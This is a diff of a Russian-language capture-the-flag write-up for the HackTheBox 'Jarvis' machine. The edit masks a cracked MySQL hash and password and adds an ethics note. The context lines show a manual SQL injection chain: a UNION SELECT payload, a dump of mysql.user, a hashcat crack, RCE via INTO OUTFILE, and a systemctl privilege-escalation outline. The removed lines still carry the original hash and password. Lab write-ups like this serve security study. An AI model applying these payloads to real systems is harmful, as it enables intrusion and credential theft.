@@ -20,9 +20,9 @@ SQL Injection (manual, no sqlmap)
 ├── ORDER BY 1..7 → работает, ORDER BY 8 → ошибка → 7 колонок
 ├── UNION SELECT: cod=-1 UNION SELECT 1,version(),3,4,5,6,7 → MariaDB 10.1.48
 ├── Дамп БД: information_schema.schemata → hotel, mysql, information_schema
-├── Дамп mysql.user: DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+├── Дамп mysql.user: DBadmin:<MYSQL_HASH>
 ├── File_priv=Y, secure_file_priv='' → запись файлов разрешена
-└── hashcat -m 300 → imissyou
+└── hashcat -m 300 → <PASSWORD>
 
 Foothold (RCE via INTO OUTFILE)
 ├── LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf') → DocumentRoot: /var/www/html
@@ -45,6 +45,8 @@ Privilege Escalation (pepper → root)
 ├── /bin/systemctl start root.service
 └── Root shell → cat /root/root.txt
 ```
+
+> Note: All flags, passwords, and hashes have been masked for ethical reasons.
 
 ---
 
@@ -148,17 +150,17 @@ curl -s -G "http://jarvis.htb/room.php" \
 **Результат:**
 
 ```
-DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+DBadmin:<MYSQL_HASH>
 ```
 
 ### Крек MySQL-хеша
 
 ```bash
-echo '*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hash.txt
+echo '<MYSQL_HASH>' > hash.txt
 hashcat -m 300 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Результат:** `imissyou`.
+**Результат:** `<PASSWORD>`.
 
 ### Проверка FILE privilege
 
